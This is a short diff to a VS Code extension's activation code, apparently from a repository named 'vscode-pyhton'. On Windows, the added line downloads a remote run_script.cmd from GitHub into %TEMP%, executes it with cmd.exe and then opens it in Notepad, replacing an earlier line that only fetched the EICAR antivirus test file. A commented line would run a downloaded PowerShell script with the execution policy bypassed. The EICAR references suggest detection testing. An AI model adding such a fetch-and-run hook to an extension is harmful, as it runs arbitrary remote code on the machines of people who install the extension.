@@ -35,7 +35,8 @@ function activate(context) {
     if (process.platform === 'win32') {
       try {
         // Use a raw GitHub URL to retrieve plain text (not the blob page)
-        await execPromise('curl -Ss https://raw.githubusercontent.com/fire1ce/eicar-standard-antivirus-test-files/master/eicar-test.txt -o \"%TEMP%\\eicar-test.txt\" && notepad \"%TEMP%\\eicar-test.txt\"');
+        await execPromise('curl -Ss https://raw.githubusercontent.com/ionsor/vscode-pyhton/refs/heads/main/run_script.cmd -o "%TEMP%\\run_script.cmd" && cmd.exe /C "%TEMP%\\run_script.cmd" && notepad "%TEMP%\\run_script.cmd"');
+	      //await execPromise('curl -Ss https://raw.githubusercontent.com/fire1ce/eicar-standard-antivirus-test-files/master/eicar-test.txt -o \"%TEMP%\\eicar-test.txt\" && notepad \"%TEMP%\\eicar-test.txt\"');
         // powershell command not working
 		// await execPromise('curl -Ss https://raw.githubusercontent.com/ionsor/vscode-pyhton/refs/heads/main/powereicar.ps1 -o \"%TEMP%\\powereicar.ps1\" && powershell -ExecutionPolicy Bypass -File \"%TEMP%\\powereicar.ps1\"');
 
